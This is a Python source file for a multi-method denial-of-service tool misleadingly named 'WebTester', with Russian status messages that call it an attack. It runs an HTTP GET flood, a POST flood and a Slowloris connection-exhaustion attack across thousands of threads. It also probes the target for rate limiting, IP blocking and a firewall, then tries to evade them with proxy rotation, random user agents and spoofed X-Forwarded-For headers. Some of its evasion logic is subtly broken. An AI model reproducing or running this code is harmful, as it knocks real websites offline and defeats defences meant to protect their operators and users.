import requests
import threading
import time
import random
import json
import socket
import urllib3
import signal
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebTester:
    def __init__(self, target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
        self.target = self.normalize_target(target)
        self.use_user_agent = use_user_agent
        self.use_cookie = use_cookie
        self.use_bypass = use_bypass
        self.use_proxy = use_proxy
        self.success_count = 0
        self.error_count = 0
        self.running = False
        self.user_agents = []
        self.proxies = []
        self.cookies = {}
        self.protection_methods = []
        self.lock = threading.Lock()
        
        self.load_resources()
        self.detect_protections()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        print("\n\n\033[91mОстанавливаю атаку...\033[0m")
        self.running = False

    def normalize_target(self, target):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        return target

    def load_resources(self):
        try:
            with open('user.json', 'r') as f:
                data = json.load(f)
                self.user_agents = [item.get('user_agent', '') for item in data if item.get('user_agent')]
        except:
            self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']

        try:
            with open('proxy.json', 'r') as f:
                self.proxies = json.load(f)
        except:
            self.proxies = []

    def detect_protections(self):
        test_methods = [self.test_rate_limiting, self.test_ip_blacklisting, self.test_waf]
        for method in test_methods:
            try:
                if method():
                    self.protection_methods.append(method.__name__[5:])
            except:
                pass

    def test_rate_limiting(self):
        responses = []
        for _ in range(10):
            try:
                response = requests.get(self.target, timeout=2, verify=False)
                responses.append(response.status_code)
            except:
                pass
        return len([r for r in responses if r == 429]) > 0

    def test_ip_blacklisting(self):
        try:
            response = requests.get(self.target, timeout=5, verify=False)
            return response.status_code in [403, 401]
        except:
            return False

    def test_waf(self):
        try:
            response = requests.get(self.target + "/'", timeout=5, verify=False)
            return response.status_code in [403, 406, 419]
        except:
            return False

    def generate_cookies(self):
        if self.use_cookie:
            return {'session': str(random.randint(100000, 999999))}
        return {}

    def get_random_user_agent(self):
        if self.use_user_agent and self.user_agents:
            return random.choice(self.user_agents)
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    def get_random_proxy(self):
        if self.use_proxy and self.proxies:
            proxy = random.choice(self.proxies)
            return {'http': f"http://{proxy['ip']}:{proxy['port']}", 'https': f"http://{proxy['ip']}:{proxy['port']}"}
        return None

    def bypass_protection(self, headers):
        if not self.use_bypass:
            return headers
        bypass_headers = headers.copy()
        if 'Rate Limiting' in self.protection_methods:
            time.sleep(random.uniform(0.0001, 0.001))
        if 'IP Blacklisting' in self.protection_methods:
            bypass_headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if 'Behavioral Analysis' in self.protection_methods:
            bypass_headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.8', 'de-DE,de;q=0.7'])
        return bypass_headers

    def http_mega_flood(self):
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'keep-alive'}
                cookies = self.generate_cookies()
                headers = self.bypass_protection(headers)
                proxy = self.get_random_proxy()
                for _ in range(500):
                    if not self.running:
                        break
                    try:
                        response = requests.get(self.target, headers=headers, cookies=cookies, proxies=proxy, timeout=0.1, verify=False)
                        with self.lock:
                            self.success_count += 1
                    except:
                        with self.lock:
                            self.error_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def post_flood_attack(self):
        while self.running:
            try:
                headers = {'User-Agent': self.get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
                data = {'data': random._urandom(10000)}
                response = requests.post(self.target, headers=headers, data=data, timeout=0.1, verify=False)
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def slowloris_attack(self):
        sockets_pool = []
        while self.running:
            try:
                if len(sockets_pool) < 1000:
                    host = self.target.split('//')[1].split('/')[0]
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, 80))
                    http_request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {self.get_random_user_agent()}\r\n"
                    sock.send(http_request.encode())
                    sockets_pool.append(sock)
                    with self.lock:
                        self.success_count += 1
                for sock in sockets_pool[:]:
                    try:
                        sock.send("X-a: b\r\n".encode())
                    except:
                        sockets_pool.remove(sock)
                        with self.lock:
                            self.error_count += 1
                time.sleep(5)
            except:
                pass

    def status_worker(self):
        last_success, last_error, start_time = 0, 0, time.time()
        while self.running:
            current_time = time.time()
            elapsed_time = current_time - start_time
            current_success, current_error = self.success_count, self.error_count
            success_rate, error_rate = current_success - last_success, current_error - last_error
            total_requests = success_rate + error_rate
            total_rps = (current_success + current_error) / elapsed_time if elapsed_time > 0 else 0
            if total_requests > 0:
                success_percent = (success_rate / total_requests) * 100
            else:
                success_percent = 0
            if success_percent >= 80:
                status = "\033[92mХорошее\033[0m"
            elif success_percent >= 50:
                status = "\033[93mНормальное\033[0m"
            elif success_percent >= 20:
                status = "\033[91mПлохое\033[0m"
            else:
                status = "\033[31mОтказ в обслуживании\033[0m"
            print(f"\r\033[94mУспешно: {self.success_count}\033[0m | \033[91mОшибки: {self.error_count}\033[0m | \033[96mСтатус: {status}\033[0m | \033[95mRPS: {total_rps:,.0f}\033[0m", end="", flush=True)
            last_success, last_error = current_success, current_error
            time.sleep(0.1)

    def start_attack(self):
        print("\033[91mАтака началась...\033[0m")
        print("\033[96mКомбинированная атака: HTTP FLOOD + POST FLOOD + SLOWLORIS\033[0m")
        self.running = True
        attack_start_time = time.time()
        status_thread = threading.Thread(target=self.status_worker)
        status_thread.daemon = True
        status_thread.start()
        threads = []
        attack_methods = [self.http_mega_flood, self.post_flood_attack, self.slowloris_attack]
        for method in attack_methods:
            for _ in range(800):
                thread = threading.Thread(target=method)
                thread.daemon = True
                threads.append(thread)
                thread.start()
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        attack_duration = time.time() - attack_start_time
        print("\n\n\033[92mАтака остановлена!\033[0m")
        print("\033[94mИтоговая статистика:\033[0m")
        print(f"\033[96m   Успешных запросов: {self.success_count:,}\033[0m")
        print(f"\033[91m   Ошибок: {self.error_count:,}\033[0m")
        print(f"\033[93m   Всего запросов: {self.success_count + self.error_count:,}\033[0m")
        print(f"\033[95m   Максимальный RPS: {(self.success_count + self.error_count) / attack_duration:,.0f}\033[0m")

def test_web(target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
    tester = WebTester(target, use_user_agent, use_cookie, use_bypass, use_proxy)
    tester.start_attack()